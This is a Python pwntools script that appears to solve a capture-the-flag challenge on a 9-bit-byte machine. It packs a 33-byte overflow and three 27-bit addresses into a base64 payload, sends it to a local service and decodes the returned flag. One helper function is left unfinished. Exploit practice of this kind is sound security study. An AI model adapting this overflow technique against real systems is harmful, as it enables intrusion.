from pwn import *
from bitarray import bitarray
context.log_level = 'debug'
def s8tos9(string):
    a = bitarray()
    for i in string:
        b = bitarray()
        b.frombytes(i)
        b.insert(0,0)
        a += b
    return a.tobytes()
    

def s9to8(data):
    a = bitarray()
    a.frombytes(data)

base64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
def encode(data):
    string = ''
    bits = data
    length = len(data)
    for i in range(length/6):
        ch = bits[:6]
        bits = bits[6:]
        string += base64char[int(ch.to01(),2)]

    if len(bits) != 0:
        string += base64char[int(bits.to01(),2)<<3]
        string += '='

    return string

def p27(a):
    bit = bin(a)[2:]
    bit = bit.rjust(27,'0')
    bit = bit[9:18]+bit[:9]+bit[-9:]
    return bitarray(bit)

t = remote("127.0.0.1", 10001)
#t = remote('127.0.0.1', 10000)

payload = 'b'*33
a = bitarray()
for i in payload:
    b = bitarray()
    b.frombytes(i)
    b.insert(0,0)
    a += b
 
a += p27(0x4010000+0x21)
a += p27(0x3fffbf7)
a += p27(0x645c)
payload = encode(a)

t.send(s8tos9(payload+'\n'))


data = t.recv()

data = t.recv()
c = bitarray()
c.frombytes(data)

flag = ''

for i in range(len(c)/9):
    ch = c[:9]
    ch.pop(0)
    c = c[9:]
    flag += ch.tobytes()
flag = flag[:flag.find('\x00')]

log.success(flag)

